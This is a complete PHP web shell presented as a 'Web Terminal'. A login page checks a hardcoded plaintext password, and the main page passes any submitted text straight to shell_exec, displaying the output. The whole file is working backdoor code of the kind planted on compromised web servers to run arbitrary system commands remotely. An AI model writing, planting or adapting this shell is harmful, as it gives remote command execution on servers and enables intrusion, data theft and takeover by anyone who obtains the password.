<?php
session_start();

// ======= AUTHENTICATION =======
$password = "Carekori@2025Tsf";

if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit();
}

if (!isset($_SESSION["logged_in"])) {
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["auth_password"])) {
        if ($_POST["auth_password"] === $password) {
            $_SESSION["logged_in"] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit();
        } else {
            $login_error = "Incorrect password.";
        }
    }

    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - Web Terminal</title>
        <style>
            body {
                background-color: #1e1e1e;
                color: #33ff33;
                font-family: monospace;
                padding: 40px;
            }
            input {
                background-color: #111;
                color: #33ff33;
                border: 1px solid #33ff33;
                padding: 10px;
                font-family: monospace;
            }
        </style>
    </head>
    <body>
        <h2>🔒 Secure Login</h2>
        <form method="post">
            <input type="password" name="auth_password" placeholder="Enter password" required />
            <input type="submit" value="Login" />
        </form>
        <?php if (!empty($login_error)) echo "<p style='color:red;'>$login_error</p>"; ?>
    </body>
    </html>
    <?php
    exit();
}
?>

<?php
$output = "";
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["command"]) && !isset($_POST["logout"])) {
    $command = trim($_POST["command"]);
    if (!empty($command)) {
        $output = shell_exec($command . " 2>&1");
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Web Terminal</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #33ff33;
            font-family: monospace;
            padding: 20px;
        }
        input[type=text] {
            width: 80%;
            background-color: #111;
            color: #33ff33;
            border: 1px solid #33ff33;
            padding: 10px;
            font-family: monospace;
        }
        input[type=submit], button {
            background-color: #111;
            color: #33ff33;
            border: 1px solid #33ff33;
            padding: 10px;
            cursor: pointer;
            font-family: monospace;
        }
        pre {
            background-color: #000;
            padding: 10px;
            border: 1px solid #33ff33;
            max-height: 400px;
            overflow-y: scroll;
        }
    </style>
    <script>
        function disableRun() {
            const btn = document.getElementById('runBtn');
            btn.disabled = true;
            btn.value = "Executing...";
        }
    </script>
</head>
<body>

<h2>Web Terminal</h2>

<form method="post" onsubmit="disableRun()">
    <label for="command">$</label>
    <input type="text" name="command" id="command" autofocus required />
    <input type="submit" id="runBtn" value="Run" />
</form>

<form method="post" style="margin-top: 20px;">
    <input type="hidden" name="logout" value="1" />
    <button type="submit">Logout</button>
</form>

<?php if (!empty($output)): ?>
    <h3>Output:</h3>
    <pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>

</body>
</html>
